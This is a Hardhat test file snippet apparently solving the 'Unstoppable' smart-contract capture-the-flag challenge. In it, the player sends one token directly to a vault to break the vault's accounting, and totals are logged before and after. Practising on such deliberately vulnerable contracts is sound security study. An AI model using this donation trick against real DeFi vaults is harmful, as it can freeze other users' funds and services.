...
describe("[Challenge] Unstoppable", function () {
  ...
  it("Execution", async function () {
    const shares = ethers.utils.formatEther(await vault.totalSupply());
    const totalAssets = ethers.utils.formatEther(await vault.totalAssets());
    console.log("toltal supply of shares", shares);
    console.log("toltal supply of shares", totalAssets);
    /** CODE YOUR SOLUTION HERE */
    // console.log("With draw all token from vault");

    // await vault.withdraw(
    //   TOKENS_IN_VAULT - INITIAL_PLAYER_TOKEN_BALANCE,
    //   deployer.address,
    //   deployer.address
    // );

    console.log("send Token to the vault");
    await token.connect(player).transfer(vault.address, 1);

    const sharesAfter = ethers.utils.formatEther(await vault.totalSupply());
    const totalAssetsAfter = ethers.utils.formatEther(
      await vault.totalAssets()
    );
    console.log("toltal supply of shares", sharesAfter);
    console.log("toltal supply of shares", totalAssetsAfter);
  });
